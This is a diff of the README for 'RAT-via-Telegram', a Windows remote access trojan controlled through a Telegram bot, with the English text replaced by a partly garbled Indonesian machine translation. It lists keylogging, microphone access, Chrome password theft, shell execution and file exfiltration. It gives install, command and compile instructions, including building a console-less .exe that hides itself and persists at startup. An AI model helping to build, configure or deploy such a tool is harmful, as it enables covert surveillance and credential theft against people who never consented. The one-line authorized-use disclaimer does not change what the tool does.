@@ -1,88 +1,77 @@
-# RAT-via-Telegram
+RAT-via-Telegram
+Alat Administrasi Jarak Jauh Windows melalui Telegram (Python 2.7) | Awalnya dibuat oleh Ritiek
 
-Windows Remote Administration Tool via Telegram (Python 2.7) | Originally created by <a href="http://github.com/Ritiek">Ritiek</a>
+Kenapa yang lain?
+Alat Administrasi Jarak Jauh saat ini di pasar menghadapi 2 masalah utama:
 
-### Why another one?
+Kurangnya enkripsi.
+Memerlukan penerusan port untuk mengontrol dari ratusan mil.
+Tikus ini mengatasi kedua masalah ini dengan menggunakan API bot Telegram.
 
-- The current Remote Administration Tools in the market face 2 major problems:
+Sepenuhnya dienkripsi. Data yang dipertukarkan tidak dapat dimata-matai menggunakan alat MITM.
+Aplikasi messenger Telegram menyediakan cara sederhana untuk berkomunikasi dengan target tanpa mengkonfigurasi port maju sebelum tangan pada target.
+Fitur:
+Keylogger dengan log judul jendela disertakan
+Dapatkan versi Windows PC target, prosesor dan banyak lagi
+Dapatkan informasi alamat IP PC target dan perkiraan lokasi di peta
+Hapus, Pindahkan file
+Tampilkan direktori saat ini
+Ubah direktori saat ini
+Daftar direktori saat ini atau yang ditentukan
+Unduh file apa pun dari target
+Unggah file lokal ke target. Kirim gambar Anda, pdf, exe atau apapun fileke bot Telegram
+Mulai otomatis memainkan video dalam layar penuh dan tidak ada kontrol untuk video youtube pada target
+Ambil Tangkapan Layar
+Jalankan file apa pun
+Akses ke mikrofon
+Mulai HTTP Proxy Server
+Bekukan keyboard target
+Jadwalkan tugas untuk dijalankan pada waktu yang ditentukan
+Encode / Decode semua file lokal
+Target Ping
+Perbarui .exe - terima kasih LearnerZone
+Tikus Tikus Kehancuran Diri
+Ubah wallpaper dari file atau url
+Jalankan python sewenang-wenang 2.7 di mana saja
+Jalankan cangkang cmd
+[TODO] Browser (IE, Firefox, Chrome) pengambilan cookie
+[TODO] Pengambilan kata sandi
+[TODO] Pantau lalu lintas web (secara grafis?)
+[TODO] Skrip fine-tuning (yaitu: jika aplikasi x dibuka y dieksekusi)
+[TODO] Bekukan mouse target
+[TODO] Tangkap papan klip (Teks, Gambar)
+[TODO] Sembunyikan ikon desktop
+[TODO] Ambil foto dari webcam (jika terpasang)
+[TODO] Kompresi audio
+Terima kasih Dviros :
 
-    - Lack of encryption.
-    - Require port forwarding in order to control from hundreds of miles.
+Pemanggilan login / kata sandi Chrome
+Tampilkan tabel ARP
+Dapatkan proses dan layanan aktif
+Komputer Shutdown / Reboot
+Tampilkan Cache DNS
+& Selebihnya datang segera!
 
-- This RAT overcomes both these issues by using the Telegram bot API.
-
-    - Fully encrypted. The data being exchanged cannot be spied upon using MITM tools.
-    - Telegram messenger app provides a simple way to communicate to the target without configuring port forward before hand on the target.
-
-## Features:
-
-- Keylogger with window title log included
-- Get target PC's Windows version, processor and more
-- Get target PC's IP address information and approximate location on map
-- Delete, Move files
-- Show current directory 
-- Change current directory 
-- List current or specified directory 
-- Download any file from the target
-- Upload local files to the target. Send your image, pdf, exe or anything as `file` to the Telegram bot
-- Autostart playing a video in fullscreen and no controls for a youtube video on target
-- Take Screenshots
-- Execute any file
-- Access to microphone 
-- Start HTTP Proxy Server
-- Freeze target's keyboard
-- Schedule tasks to run at specified datetime
-- Encode/Decode all local files
-- Ping targets
-- Update .exe -- thanks <a href="http://github.com/LearnerZone">LearnerZone</a>
-- Self-Destruct RAT
-- Change wallpaper from file or url
-- Execute arbitrary python 2.7 on the go
-- Execute cmd shell
-- [TODO] Browser (IE, Firefox, ~~Chrome~~) cookies retrieval
-- [TODO] Password retrieval
-- [TODO] Monitor web traffic (graphically?)
-- [TODO] Fine-tuning scripting (i.e.: if app x is opened y is executed)
-- [TODO] Freeze target's mouse
-- [TODO] Capture clipboard (Text, Image)
-- [TODO] Hide desktop icons
-- [TODO] Take snapshots from the webcam (if attached)
-- [TODO] Audio compression
-
- Thanks <a href="http://github.com/Dviros">Dviros</a>:
-- Chrome login/password retrieval 
-- Display ARP table 
-- Get active processes and services
-- Shutdown/Reboot computer
-- Display DNS Cache
+Tangkapan layar:
 
 
-& More coming soon!
+Instalasi & Penggunaan:
+Klon repositori ini.
+Mengatur bot Telegram baru yang berbicara dengan BotFather.
+Salin token ini dan gantilah di awal skrip.
+Menginstal dependensi: pip install -r requirements.txt.
+Instal pyHook 64-bitatau 32-bittergantung pada sistem Anda.
+Untuk 64-bit- pip install pyHook-1.5.1-cp27-cp27m-win_amd64.whl.
+Untuk 32-bit- pip install pyHook-1.5.1-cp27-cp27m-win32.whl.
+Untuk menjalankan script: python RATAttack.py.
+Temukan bot Anda di telegram dan kirim beberapa perintah ke bot untuk mengujinya.
+Untuk membatasi bot sehingga hanya merespons Anda, catat chat_iddari konsol Anda dan ganti dalam skrip dan komentari garis return True. Jangan khawatir, Anda akan tahu kapan Anda membaca komentar di skrip.
 
-## Screenshots:
 
-<img src="http://i.imgur.com/I5nzrbz.jpg"/>
+- Folder bernama `RATAttack` akan dibuat di direktori kerja Anda yang berisi` keylogs.txt` dan file apa pun yang Anda unggah ke bot.
+Perintah:
+Saat menggunakan perintah di bawah ini; gunakan /sebagai awalan. Sebagai contoh: /pc_info.
 
-## Installation & Usage:
-
-- Clone this repository.
-- Set up a new Telegram bot talking to the `BotFather`.
-- Copy this token and replace it in the beginning of the script.
-- Install the dependencies: `pip install -r requirements.txt`.
-- Install pyHook `64-bit` or `32-bit` depending on your system.
-    - For 64-bit- `pip install pyHook-1.5.1-cp27-cp27m-win_amd64.whl`.
-    - For 32-bit- `pip install pyHook-1.5.1-cp27-cp27m-win32.whl`.
-- To run the script: `python RATAttack.py`.
-- Find your bot on telegram and send some command to the bot to test it.
-- To restrict the bot so that it responds only to you, note down your `chat_id` from the console and replace it in the script and comment out the line `return True`. Don't worry, you'll know when you read the comments in the script.
-<img src="http://i.imgur.com/XKARtrp.png">
-- A folder named `RATAttack` will be created in your working directory containing `keylogs.txt` and any files you upload to the bot.
-
-### Commands:
-
-When using the below commands; use `/` as a prefix. For example: `/pc_info`.
-
-```
 arp - display arp table
 capture_pc - screenshot PC
 cmd_exec - execute shell command
@@ -117,38 +106,26 @@ tasklist - display services and processes running
 to - select targets by it's name
 update - update executable
 wallpaper - change wallpaper
-```
+Anda dapat menyalin di atas untuk memperbarui daftar perintah Anda melalui BotFathersehingga Anda tidak perlu mengetiknya secara manual.
 
-You can copy the above to update your command list via `BotFather` so you don't have to type them manually.
+Kompilasi:
+Cara Mengompilasi:
+Antara:
+Replace your path in compileAndRun.bat (running this will actually run the executable)
+Atau:
+Run `pyinstaller --onefile --noconsole C:\path\to\RATAttack.py`. You can also pass `--icon=<path\to\icon.ico>` to use any custom icon.
+Setelah berhasil dikompilasi, cari .exefile di dalamnya C:\Python27\Scripts\dist\. Anda dapat mengubah nama dari .exeapa pun yang Anda inginkan.
+AWAS! Jika Anda menjalankan compiled .exe, script akan menyembunyikan dirinya dan menginfeksi PC Anda untuk dijalankan saat startup. Anda dapat kembali ke normal dengan menggunakan /self_destructopsi atau secara manual menghapus C:\Users\Username\AppData\Roaming\Portaldirektori dan C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\portal.lnk(meskipun saya merekomendasikan untuk menghapusnya secara manual untuk sementara waktu).
+Memodifikasi Pengaturan:
+Anda juga dapat memodifikasi nama .exefile tersembunyi dan lokasi & nama folder tempat tersembunyi .exeakan menyembunyikan dirinya. Untuk melakukan ini; memodifikasi compiled_namedan hide_foldermasing - masing.
+Tetapkan id obrolan Anda yang dikenal ke awal RATAttack.py
+Catatan:
+Saat ini hanya Python2 yang didukung. Dukungan Python3 akan ditambahkan segera!
+Berkontribusi:
+Proyek ini masih dalam tahap awal, jadi Anda bisa mengharapkan beberapa bug. Silakan melaporkannya! Lebih baik lagi, kirim permintaan tarik :)
+Setiap fitur dan ide baru sangat disambut! Harap kirimkan permintaan fitur dengan membuat Masalah
+Penolakan:
+Alat ini seharusnya hanya digunakan pada sistem yang resmi. Setiap penggunaan tanpa izin dari alat ini tanpa izin eksplisit adalah ilegal.
 
-## Compiling:
-
-### How To Compile:
-#### Either:
-	Replace your path in compileAndRun.bat (running this will actually run the executable)
-#### Or:
-	Run `pyinstaller --onefile --noconsole C:\path\to\RATAttack.py`. You can also pass `--icon=<path\to\icon.ico>` to use any custom icon.
-- Once it is compiled successfully, find the `.exe` file in `C:\Python27\Scripts\dist\`. You can change the name of the `.exe` to anything you wish.
-- **BEWARE!** If you run the compiled `.exe`, the script will hide itself and infect your PC to run at startup. You can return to normal by using the `/self_destruct` option or manually removing `C:\Users\Username\AppData\Roaming\Portal` directory and `C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\portal.lnk` (although I recommend removing them manually for the time being).
-
-### Modifying Settings:
-
-- You can also modify the name of hidden `.exe` file and location & name of the folder where the hidden `.exe` will hide itself. To do this; modify `compiled_name` and `hide_folder` respectively.
-- Assign your known chat ids to beginning of RATAttack.py
-
-## Notes:
-
-- Currently only Python2 is supported. Python3 support will be added soon!
-
-## Contributing:
-
-- This project is still in very early stages, so you can expect some bugs. Please feel free to report them! Even better, send a pull request :)
-- Any new features and ideas are most welcome! Please do submit feature requests by creating Issues
-
-## Disclaimer:
-
-**This tool is supposed to be used only on authorized systems. Any unauthorized use of this tool without explicit permission is illegal.**
-
-## License:
-
-`The MIT License`
+Lisensi:
+The MIT License
